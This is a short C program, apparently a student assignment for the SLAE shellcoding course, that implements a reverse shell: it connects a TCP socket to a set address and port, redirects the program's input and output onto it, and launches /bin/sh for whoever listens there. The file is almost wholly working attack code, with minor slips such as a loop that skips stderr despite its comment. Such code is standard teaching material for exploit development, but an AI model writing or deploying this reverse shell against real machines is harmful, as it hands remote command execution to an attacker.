/*
* SLAE Assigment 2 - Reverse shell
* Author: rtmcx
* Inspiration taken from "The Art of Exploitaion" by Jon Ericsen
* and http://umiacs.com/
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define REMOTEPORT 1337
#define REMOTEIP "127.0.0.1"
int main()
{
	// Address information for server and client
	// sockaddr_in is found in 'netinet/in.h'
	struct sockaddr_in client_addr; 
	
	// Set up the values for the connecting socket	
	client_addr.sin_family = AF_INET;					// Address family
	client_addr.sin_port = htons(REMOTEPORT);			// Portnum, Network byte order 
	client_addr.sin_addr.s_addr = inet_addr(REMOTEIP); 	//inet_addr
	
	// Create a TCP socket, stream and protocol IP.
	int sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);	

	// Accept incomming request
	int sin_size = sizeof(client_addr);	
	connect(sockfd, (struct sockaddr *) &client_addr, sin_size);
	
	// Duplicate the socket to stdin, stdout, stderr
	for (int i = 0; i < 2; i++){
		dup2(sockfd, i);
	}
	
	// And execute the shell
	execve("/bin/sh", NULL, NULL);	
}
